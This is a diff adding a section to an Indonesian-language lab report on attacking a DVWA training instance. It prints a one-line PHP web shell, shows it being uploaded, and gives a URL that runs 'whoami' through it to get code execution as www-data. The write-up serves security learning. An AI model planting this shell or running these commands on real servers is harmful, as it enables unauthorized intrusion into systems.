@@ -145,3 +145,27 @@ Saya menargetkan modul "SQL Injection" di DVWA. Pertama, saya login ke DVWA dan 
 ![Set Security Level Low](./dvwa-security-low.png)
 ...
 ![Hasil SQL Injection Sukses](./sqli-success.png)
+
+**b. Web Shell Upload & Remote Code Execution (RCE)**
+Saya memanfaatkan kerentanan "File Upload" dan izin `chmod 777` untuk mengunggah *web shell* sederhana (`shell.php`).
+
+  * **Pembuatan Shell:**
+
+    ```bash
+    echo '<?php system($_GET["cmd"]); ?>' > ~/Desktop/shell.php
+    ```
+
+  * **Proses Upload:** Menggunakan fitur *upload* di DVWA.
+
+  * **Eksekusi Perintah (RCE):** Mengakses *shell* melalui browser dan menjalankan perintah `whoami`.
+    `http://98.93.196.5/dvwa/hackable/uploads/shell.php?cmd=whoami`
+
+  * **Hasil:** Server merespons dengan **`www-data`**, mengonfirmasi bahwa saya berhasil mendapatkan *Remote Code Execution* sebagai *user web server*.
+
+**Kesimpulan Eksploitasi:** Server berhasil dikompromikan melalui kerentanan aplikasi web (SQLi dan File Upload) yang diperparah oleh miskonfigurasi izin server (`chmod 777`) dan *firewall* yang terlalu permisif (*Security Group*).
+
+![Membuat shell.php](./create-shell.png)
+...
+![Upload shell.php berhasil](./upload-success.png)
+...
+![Hasil RCE whoami](./rce-whoami.png)
